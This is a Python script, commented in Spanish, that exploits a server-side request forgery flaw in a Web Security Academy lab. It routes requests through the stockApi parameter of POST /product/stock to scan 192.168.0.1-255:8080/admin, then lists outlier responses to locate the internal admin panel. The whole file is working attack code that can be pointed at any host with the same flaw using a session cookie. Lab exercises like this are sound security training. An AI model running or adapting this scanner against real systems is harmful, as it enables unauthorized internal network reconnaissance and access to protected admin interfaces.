#!/usr/bin/env python3
"""
Escanea 192.168.0.1-255:8080/admin via SSRF en POST /product/stock.

Uso:
    python3 scan.py <lab-host> <session-cookie> [--subnet 192.168.0] [--port 8080] [--workers 30]

Ejemplo:
    python3 scan.py 0af3007203fc990a83f301ff00b80014.web-security-academy.net \\
        9hHdN7mthoxVa44RT6sfI4bfHiH38JWX

La salida lista los outliers: la IP correcta devuelve status/length distinto al
resto (el resto suele dar 500 con cuerpo de error casi idéntico; la correcta
devuelve 200 con HTML del panel admin).
"""
import argparse
import sys
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


def make_session(cookie: str) -> requests.Session:
    s = requests.Session()
    s.cookies.set("session", cookie)
    s.headers.update({
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 ssrf-scan",
    })
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503])
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_maxsize=64))
    return s


def probe(session: requests.Session, host: str, inner_url: str, octet: int):
    body = f"stockApi={quote(inner_url, safe='')}"
    try:
        r = session.post(f"https://{host}/product/stock", data=body, timeout=15, allow_redirects=False)
        return octet, r.status_code, len(r.content), ""
    except requests.RequestException as e:
        return octet, -1, 0, type(e).__name__


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("host", help="lab host, ej. 0af3....web-security-academy.net")
    p.add_argument("cookie", help="valor de la cookie session")
    p.add_argument("--subnet", default="192.168.0", help="primeros 3 octetos (default 192.168.0)")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--path", default="/admin")
    p.add_argument("--workers", type=int, default=30)
    args = p.parse_args()

    print(f"[*] target: http://{args.subnet}.X:{args.port}{args.path} (X = 1..255)", file=sys.stderr)
    print(f"[*] via:    https://{args.host}/product/stock (workers={args.workers})", file=sys.stderr)

    session = make_session(args.cookie)

    def inner(octet: int) -> str:
        return f"http://{args.subnet}.{octet}:{args.port}{args.path}"

    results = []
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futures = [ex.submit(probe, session, args.host, inner(o), o) for o in range(1, 256)]
        for fut in as_completed(futures):
            results.append(fut.result())

    results.sort(key=lambda r: r[0])

    status_counts = Counter(r[1] for r in results)
    length_counts = Counter(r[2] for r in results if r[1] > 0)
    print(f"\n[*] status distribution: {dict(status_counts)}", file=sys.stderr)
    print(f"[*] length distribution top 5: {length_counts.most_common(5)}", file=sys.stderr)

    common_status = status_counts.most_common(1)[0][0]
    common_length = length_counts.most_common(1)[0][0] if length_counts else None
    print("\n[*] outliers (status/length distintos al modo):", file=sys.stderr)
    found_any = False
    for octet, status, length, err in results:
        if status != common_status or (status > 0 and length != common_length):
            found_any = True
            extra = f" err={err}" if err else ""
            print(f"  {args.subnet}.{octet:<3}  status={status}  len={length}{extra}")
    if not found_any:
        print("  ninguno. revisa rango/puerto/path o aumenta --workers/timeout.", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
